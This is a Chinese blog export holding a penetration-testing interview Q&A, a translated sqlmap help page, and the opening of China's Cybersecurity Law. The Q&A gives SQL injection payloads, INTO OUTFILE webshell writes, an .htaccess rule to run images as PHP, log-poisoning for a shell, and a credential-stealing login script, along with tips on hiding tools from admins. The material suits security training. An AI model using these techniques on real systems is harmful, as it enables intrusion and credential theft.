提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权​ 5) 日志清理​ 6）总结报告及修复方案 2.判断出网站的CMS对渗透有什么意义？ ​ 查找网上已曝光的程序漏洞。 ​ 如果开源，还能下载相对应的源码进行代码审计。 3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？ ​ 敏感文件、二级目录扫描 ​ 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 4.常见的网站服务器容器。 ​ IIS、Apache、nginx、Lighttpd、Tomcat 5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？ ​ root权限以及网站的绝对路径。 6.目前已知哪些版本的容器有解析漏洞，具体举例。 ​ IIS 6.0​ /xx.asp/xx.jpg “xx.asp”是文件夹名 ​ IIS 7.0/7.5​ 默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析 ​ Nginx​ 版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。​ 空字节代码 xxx.jpg.php ​ Apache​ 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀 ​ lighttpd​ xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！ 7.如何手工快速判断目标站是windows还是linux服务器？ ​ linux大小写敏感,windows大小写不敏感。 8.为何一个mysql数据库的站，只有一个80端口开放？ ​ 更改了端口，没有扫描出来。 ​ 站库分离。 ​ 3306端口不对外开放 9.无法连接3389的几种情况 ​ 没开放3389 端口 ​ 端口被修改 ​ 防护拦截 ​ 处于内网(需进行端口转发) 10.如何突破注入时字符被转义？ ​ 宽字符注入 ​ hex编码绕过 11.在某后台新闻编辑界面看到编辑器，应该先做什么？ ​ 查看编辑器的名称版本,然后搜索公开的漏洞。 12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？ ​ 能做的事情很多，用隐藏网马来举例子：​ 插入​ &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php ​ .jpg文件会被解析成.php文件。 ​ 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 13.注入漏洞只能查账号密码？ ​ 只要权限广，拖库脱到老。 14.安全狗会追踪变量，从而发现出是一句话木马吗？ ​ 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。 15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？** ​ 迅雷下载，直接改后缀为.mdb。 16.提权时选择可读写目录，为何尽量不用带空格的目录？ ​ 因为exp执行多半需要空格界定参数 17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？ ​ 同数据库。 18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？ ​ and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 19:某个防注入系统，在注入时会提示： 系统检测到你有非法注入的行为。已记录您的ip xx.xx.xx.xx时间:2016:01-23提交页面:test.asp?id=15提交内容:and 1=1 20、如何利用这个防注入系统拿shell？ 在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。 21.上传大马后访问乱码时，有哪些解决办法？ ​ 浏览器中改编码。 22.审查上传点的元素有什么意义？ ​ 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？ ​ 先爆破用户名，再利用被爆破出来的用户名爆破密码。 ​ 其实有些站点，在登陆处也会这样提示 ​ 所有和数据库有交互的地方都有可能有注入。 24.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？ ​ 这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？ ​ 直接在网站二级目录/abc/下扫描敏感文件及目录。 26.在有shell的情况下，如何使用xss实现对目标站的长久控制？ ​ 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。 ​ 在登录后才可以访问的文件中插入XSS脚本。 27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？ ​ 审查元素 把密码处的password属性改成text就明文显示了 28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？ ​ 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过 29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？ ​ 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。 30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？ ​ 隐藏文件夹，为了不让管理员发现你传上去的工具。 31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由： A. demo.jsp?id=2+1 B. demo.jsp?id=2-1选B，在 URL 编码中 + 代表空格，可能会造成混淆 32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？ demo.do?DATA=AjAxNg==DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？ 有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell 34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验RefererXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 35、CSRF、SSRF和重放攻击有什么区别？ CSRF是跨站请求伪造攻击，由客户端发起SSRF是服务器端请求伪造，由服务器发起重放攻击是将截获的数据包进行重放，达到身份认证等目的 36、说出至少三种业务逻辑漏洞，以及修复方式？ 密码找回漏洞中存在 1）密码允许暴力破解、 2）存在通用型找回凭证、 3）可以跳过验证步骤、 4）找回凭证可以拦包获取 等方式来通过厂商提供的密码找回功能来得到密码。身份认证漏洞中最常见的是 1）会话固定攻击 2） Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造用户身份。验证码漏洞中存在 1）验证码允许暴力破解 2）验证码可以通过 Javascript 或者改包的方法来进行绕过 37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？ get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”HTTP/1.1Host:.com:82User-Agent:Mozilla/5.0 Firefox/40Accept:text/css,/;q=0.1Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3Referer:http://****.com/eciop/orderForCC/cgtListForCC.htm?zone=11370601&amp;v=145902Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;st_uid=N90PLYHLZGJXI-NX01VPUF46W;status=TrueConnection:keep-alive 38、给你一个网站你是如何来渗透测试的? 在获取书面授权的前提下。 39、sqlmap，怎么对一个注入点注入？ 1）如果是get型号，直接，sqlmap -u “诸如点网址”. 2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址” 40、nmap，扫描的几种方式 https://www.jianshu.com/p/56ea8b844eb7 41、sql注入的几种类型？ 1）报错注入 2）bool型注入 3）延时注入 4）宽字节注入 42、报错注入的函数有哪些？ 10个 1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】—————- 2）通过floor报错 向下取整 3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b)); 5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b)); 6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b)); 7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b)); 8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b)); 9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b)); 10）.exp()select from test where id=1 and exp(~(select * from(select user())a)); 43、延时注入如何来判断？ if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) 44、盲注和延时注入的共同点？ 都是一个字符一个字符的判断 45、如何拿一个网站的webshell？ 上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等 46、sql注入写文件都有哪些函数？ select ‘一句话’ into outfile ‘路径’ select ‘一句话’ into dumpfile ‘路径’ select ‘‘ into dumpfile ‘d:\\wwwroot\\baidu.com\\nvhack.php’; 47、如何防止CSRF? 1,验证referer 2，验证token 详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd 48、owasp 漏洞都有哪些？ 1、SQL注入防护方法： 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 49、SQL注入防护方法？ 1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。 50、代码执行，文件读取，命令执行的函数都有哪些？ 1）代码执行： eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function 2）文件读取： file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等3)命令执行： system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？ src指定一个远程的脚本文件，获取referer 52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。 1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application/x-httpd-php .jpg &lt;img src=http://xss.tv/1.jpg&gt; 会以php方式来解析","link":"/2019/03/03/一套渗透测试岗面试题/"},{"title":"sqlmap帮助文档","text":"Usage: python sqlmap.py [options] Options（选项）: -h, –help Show basic help message and exit 显示此帮助消息并退出 -hh Show advanced help message and exit 展示先进的帮助信息并退出 –version Show program’s version number and exit 显示程序的版本号并退出 -v VERBOSE Verbosity level: 0-6 (default 1) 详细级别：0-6（默认为1） Target（目标）: At least one of these options has to be provided to define the target(s) 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT Connection string for direct database connection 直接连接到数据库。 -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) 目标URL。 -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file 解析目标(s)从Burp或WebScarab代理日志文件 -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file 解析目标(s)从远程站点地图文件(.xml) -m BULKFILE Scan multiple targets given in a textual file 扫描文本文件中给出的多个目标 -r REQUESTFILE Load HTTP request from a file 从文件加载HTTP请求 -g GOOGLEDORK Process Google dork results as target URLs 处理Google dork的结果作为目标URL。 -c CONFIGFILE Load options from a configuration INI file 从INI配置文件中加载选项。 Request（请求）: These options can be used to specify how to connect to the target URL 这些选项可以用来指定如何连接到目标URL。 --method=METHOD Force usage of given HTTP method (e.g. PUT) 强制使用给定的HTTP方法（e.g. PUT） --data=DATA Data string to be sent through POST 通过POST发送的数据字符串 --param-del=PARA.. Character used for splitting parameter values 用于拆分参数值的字符 --cookie=COOKIE HTTP Cookie header value HTTP Cookie头的值 --cookie-del=COO.. Character used for splitting cookie values 用于分割Cookie值的字符 --load-cookies=L.. File containing cookies in Netscape/wget format 包含Netscape / wget格式的cookie的文件 --drop-set-cookie Ignore Set-Cookie header from response 从响应中忽略Set-Cookie头 --user-agent=AGENT HTTP User-Agent header value 指定 HTTP User - Agent头 --random-agent Use randomly selected HTTP User-Agent header value 使用随机选定的HTTP User - Agent头 --host=HOST HTTP Host header value HTTP主机头值 --referer=REFERER HTTP Referer header value 指定 HTTP Referer头 -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) 额外header --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;) 额外header --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) HTTP认证凭证(name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file HTTP认证 PEM认证/私钥文件 --ignore-401 Ignore HTTP Error 401 (Unauthorized) 忽略HTTP错误401(未经授权) --proxy=PROXY Use a proxy to connect to the target URL 使用代理连接到目标网址 --proxy-cred=PRO.. Proxy authentication credentials (name:password) 代理认证证书(name:password) --proxy-file=PRO.. Load proxy list from a file 从文件中加载代理列表 --ignore-proxy Ignore system default proxy settings 忽略系统默认代理设置 --tor Use Tor anonymity network 使用Tor匿名网络 --tor-port=TORPORT Set Tor proxy port other than default 设置Tor代理端口而不是默认值 --tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型 --check-tor Check to see if Tor is used properly 检查Tor是否正确使用 --delay=DELAY Delay in seconds between each HTTP request 每个HTTP请求之间的延迟（秒） --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30） --retries=RETRIES Retries when the connection timeouts (default 3) 连接超时时重试（默认值3） --randomize=RPARAM Randomly change value for given parameter(s) 随机更改给定参数的值(s) --safe-url=SAFEURL URL address to visit frequently during testing 在测试期间频繁访问的URL地址 --safe-post=SAFE.. POST data to send to a safe URL POST数据发送到安全URL --safe-req=SAFER.. Load safe HTTP request from a file 从文件加载安全HTTP请求 --safe-freq=SAFE.. Test requests between two visits to a given safe URL 在两次访问给定安全网址之间测试请求 --skip-urlencode Skip URL encoding of payload data 跳过有效载荷数据的URL编码 --csrf-token=CSR.. Parameter used to hold anti-CSRF token 参数用于保存anti-CSRF令牌 --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token 提取anti-CSRF URL地址访问令牌 --force-ssl Force usage of SSL/HTTPS 强制使用SSL / HTTPS --hpp Use HTTP parameter pollution method 使用HTTP参数pollution的方法 --eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码 &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization（优化）: These options can be used to optimize the performance of sqlmap 这些选项可用于优化sqlmap的性能 -o Turn on all optimization switches 开启所有优化开关 --predict-output Predict common queries output 预测常见的查询输出 --keep-alive Use persistent HTTP(s) connections 使用持久的HTTP（S）连接 --null-connection Retrieve page length without actual HTTP response body 从没有实际的HTTP响应体中检索页面长度 --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) 最大的HTTP（S）请求并发量（默认为1） Injection（注入）: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER Testable parameter(s) 可测试的参数（S） --skip=SKIP Skip testing for given parameter(s) 跳过对给定参数的测试 --skip-static Skip testing parameters that not appear to be dynamic 跳过测试不显示为动态的参数 --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;） --dbms=DBMS Force back-end DBMS to this value 强制后端的DBMS为此值 --dbms-cred=DBMS.. DBMS authentication credentials (user:password) DBMS认证凭证(user:password) --os=OS Force back-end DBMS operating system to this value 强制后端的DBMS操作系统为这个值 --invalid-bignum Use big numbers for invalidating values 使用大数字使值无效 --invalid-logical Use logical operations for invalidating values 使用逻辑操作使值无效 --invalid-string Use random strings for invalidating values 使用随机字符串使值无效 --no-cast Turn off payload casting mechanism 关闭有效载荷铸造机制 --no-escape Turn off string escaping mechanism 关闭字符串转义机制 --prefix=PREFIX Injection payload prefix string 注入payload字符串前缀 --suffix=SUFFIX Injection payload suffix string 注入payload字符串后缀 --tamper=TAMPER Use given script(s) for tampering injection data 使用给定的脚本（S）篡改注入数据 Detection（检测）: These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 --level=LEVEL Level of tests to perform (1-5, default 1) 执行测试的等级（1-5，默认为1） --risk=RISK Risk of tests to perform (1-3, default 1) 执行测试的风险（0-3，默认为1） --string=STRING String to match when query is evaluated to True 查询时有效时在页面匹配字符串 --not-string=NOT.. String to match when query is evaluated to False 当查询求值为无效时匹配的字符串 --regexp=REGEXP Regexp to match when query is evaluated to True 查询时有效时在页面匹配正则表达式 --code=CODE HTTP code to match when query is evaluated to True 当查询求值为True时匹配的HTTP代码 --text-only Compare pages based only on the textual content 仅基于在文本内容比较网页 --titles Compare pages based only on their titles 仅根据他们的标题进行比较 Techniques（技巧）: These options can be used to tweak testing of specific SQL injection techniques 这些选项可用于调整具体的SQL注入测试。 --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) SQL注入技术测试（默认BEUST） --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) DBMS响应的延迟时间（默认为5秒） --union-cols=UCOLS Range of columns to test for UNION query SQL injection 定列范围用于测试UNION查询注入 --union-char=UCHAR Character to use for bruteforcing number of columns 用于暴力猜解列数的字符 --union-from=UFROM Table to use in FROM part of UNION query SQL injection 要在UNION查询SQL注入的FROM部分使用的表 --dns-domain=DNS.. Domain name used for DNS exfiltration attack 域名用于DNS漏出攻击 --second-order=S.. Resulting page URL searched for second-order response 生成页面的URL搜索为second-order响应 Fingerprint（指纹）: -f, --fingerprint Perform an extensive DBMS version fingerprint 执行检查广泛的DBMS版本指纹 Enumeration（枚举）: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -a, --all Retrieve everything 检索一切 -b, --banner Retrieve DBMS banner 检索数据库管理系统的标识 --current-user Retrieve DBMS current user 检索数据库管理系统的标识 --current-db Retrieve DBMS current database 检索数据库管理系统当前数据库 --hostname Retrieve DBMS server hostname 检索数据库服务器的主机名 --is-dba Detect if the DBMS current user is DBA 检测DBMS当前用户是否DBA --users Enumerate DBMS users 枚举数据库管理系统用户 --passwords Enumerate DBMS users password hashes 枚举数据库管理系统用户密码哈希 --privileges Enumerate DBMS users privileges 枚举数据库管理系统用户的权限 --roles Enumerate DBMS users roles 枚举数据库管理系统用户的角色 --dbs Enumerate DBMS databases 枚举数据库管理系统数据库 --tables Enumerate DBMS database tables 枚举的DBMS数据库中的表 --columns Enumerate DBMS database table columns 枚举DBMS数据库表列 --schema Enumerate DBMS schema 枚举数据库架构 --count Retrieve number of entries for table(s) 检索表的条目数 --dump Dump DBMS database table entries 转储数据库管理系统的数据库中的表项 --dump-all Dump all DBMS databases tables entries 转储数据库管理系统的数据库中的表项 --search Search column(s), table(s) and/or database name(s) 搜索列（S），表（S）和/或数据库名称（S） --comments Retrieve DBMS comments 检索数据库的comments(注释、评论) -D DB DBMS database to enumerate 要进行枚举的数据库名 -T TBL DBMS database table(s) to enumerate 要进行枚举的数据库表 -C COL DBMS database table column(s) to enumerate 要进行枚举的数据库列 -X EXCLUDECOL DBMS database table column(s) to not enumerate 要不进行枚举的数据库列 -U USER DBMS user to enumerate 用来进行枚举的数据库用户 --exclude-sysdbs Exclude DBMS system databases when enumerating tables 枚举表时排除系统数据库 --pivot-column=P.. Pivot column name 主列名称 --where=DUMPWHERE Use WHERE condition while table dumping 使用WHERE条件进行表转储 --start=LIMITSTART First query output entry to retrieve 第一个查询输出进入检索 --stop=LIMITSTOP Last query output entry to retrieve 最后查询的输出进入检索 --first=FIRSTCHAR First query output word character to retrieve 第一个查询输出字的字符检索 --last=LASTCHAR Last query output word character to retrieve 最后查询的输出字字符检索 --sql-query=QUERY SQL statement to be executed 要执行的SQL语句 --sql-shell Prompt for an interactive SQL shell 提示交互式SQL的shell --sql-file=SQLFILE Execute SQL statements from given file(s) 从给定文件执行SQL语句 Brute force（蛮力）: These options can be used to run brute force checks 这些选项可以被用来运行蛮力检查。 --common-tables Check existence of common tables 检查存在共同表 --common-columns Check existence of common columns 检查存在共同列 User-defined function injection（用户自定义函数注入）:​ These options can be used to create custom user-defined functions 这些选项可以用来创建用户自定义函数。 --udf-inject Inject custom user-defined functions 注入用户自定义函数 --shared-lib=SHLIB Local path of the shared library 共享库的本地路径 File system access（访问文件系统）: These options can be used to access the back-end database management system underlying file system 这些选项可以被用来访问后端数据库管理系统的底层文件系统。 --file-read=RFILE Read a file from the back-end DBMS file system 从后端的数据库管理系统文件系统读取文件 --file-write=WFILE Write a local file on the back-end DBMS file system 编辑后端的数据库管理系统文件系统上的本地文件 --file-dest=DFILE Back-end DBMS absolute filepath to write to 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）: These options can be used to access the back-end database management system underlying operating system 这些选项可以用于访问后端数据库管理系统的底层操作系统。 --os-cmd=OSCMD Execute an operating system command 执行操作系统命令 --os-shell Prompt for an interactive operating system shell 交互式的操作系统的shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC 获取一个OOB shell，meterpreter或VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC 一键获取一个OOB shell，meterpreter或VNC --os-bof Stored procedure buffer overflow exploitation 存储过程缓冲区溢出利用 --priv-esc Database process user privilege escalation 数据库进程用户权限提升 --msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework本地的安装路径 --tmp-path=TMPPATH Remote absolute path of temporary files directory 远程临时文件目录的绝对路径 Windows registry access（Windows注册表访问）: These options can be used to access the back-end database management system Windows registry 这些选项可以被用来访问后端数据库管理系统Windows注册表。 --reg-read Read a Windows registry key value 读一个Windows注册表项值 --reg-add Write a Windows registry key value data 写一个Windows注册表项值数据 --reg-del Delete a Windows registry key value 删除Windows注册表键值 --reg-key=REGKEY Windows registry key Windows注册表键 --reg-value=REGVAL Windows registry key value Windows注册表项值 --reg-data=REGDATA Windows registry key value data Windows注册表键值数据 --reg-type=REGTYPE Windows registry key value type Windows注册表项值类型 General（一般）: These options can be used to set some general working parameters 这些选项可以用来设置一些一般的工作参数。 -s SESSIONFILE Load session from a stored (.sqlite) file 保存和恢复检索会话文件的所有数据 -t TRAFFICFILE Log all HTTP traffic into a textual file 记录所有HTTP流量到一个文本文件中 --batch Never ask for user input, use the default behaviour 从不询问用户输入，使用所有默认配置。 --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) 具有二进制值的结果字段 --charset=CHARSET Force character encoding used for data retrieval 强制用于数据检索的字符编码 --crawl=CRAWLDEPTH Crawl the website starting from the target URL 从目标网址开始抓取网站 --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) 正则表达式排除网页抓取 --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) 分隔CSV输出中使用的字符 --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) 转储数据的格式 --eta Display for each output the estimated time of arrival 显示每个输出的预计到达时间 --flush-session Flush session files for current target 刷新当前目标的会话文件 --forms Parse and test forms on target URL 在目标网址上解析和测试表单 --fresh-queries Ignore query results stored in session file 忽略在会话文件中存储的查询结果 --hex Use DBMS hex function(s) for data retrieval 使用DBMS hex函数进行数据检索 --output-dir=OUT.. Custom output directory path 自定义输出目录路径 --parse-errors Parse and display DBMS error messages from responses 解析和显示响应中的DBMS错误消息 --save=SAVECONFIG Save options to a configuration INI file 保存选项到INI配置文件 --scope=SCOPE Regexp to filter targets from provided proxy log 使用正则表达式从提供的代理日志中过滤目标 --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) 根据有效负载和/或标题(e.g. ROW)选择测试 --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) 根据有效负载和/或标题跳过测试（e.g. BENCHMARK） --update Update sqlmap 更新SqlMap Miscellaneous（杂项）: -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) 使用简短的助记符 --alert=ALERT Run host OS command(s) when SQL injection is found 在找到SQL注入时运行主机操作系统命令 --answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;) 设置问题答案 --beep Beep on question and/or when SQL injection is found 发现SQL注入时提醒 --cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap具体的UDF和表清理DBMS --dependencies Check for missing (non-core) sqlmap dependencies 检查是否缺少（非内核）sqlmap依赖关系 --disable-coloring Disable console output coloring 禁用控制台输出颜色 --gpage=GOOGLEPAGE Use Google dork results from specified page number 使用Google dork结果指定页码 --identify-waf Make a thorough testing for a WAF/IPS/IDS protection 对WAF / IPS / IDS保护进行全面测试 --skip-waf Skip heuristic detection of WAF/IPS/IDS protection 跳过启发式检测WAF / IPS / IDS保护 --mobile Imitate smartphone through HTTP User-Agent header 通过HTTP User-Agent标头模仿智能手机 --offline Work in offline mode (only use session data) 在离线模式下工作（仅使用会话数据） --page-rank Display page rank (PR) for Google dork results Google dork结果显示网页排名（PR） --purge-output Safely remove all content from output directory 安全地从输出目录中删除所有内容 --smart Conduct thorough tests only if positive heuristic(s) 只有在正启发式时才进行彻底测试 --sqlmap-shell Prompt for an interactive sqlmap shell 提示交互式sqlmap shell --wizard Simple wizard interface for beginner users 给初级用户的简单向导界面","link":"/2018/08/08/sqlmap帮助文档/"},{"title":"中华人民共和国网络安全法","text":"中华人民共和国主席令 第五十三号 《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。 中华人民共和国主席 习近平 2016年11月7日 中华人民共和国网络安全法 目 录 第一章 总则 第二章 网络安全支持与促进 第三章 网络运行安全 第一节 一般规定 第二节 关键信息基础设施的运行安全 第四章 网络信息安全 第五章 监测预警与应急处置 第六章 法律责任 第七章 附则 第一章 总则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。 县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。 第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。 任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 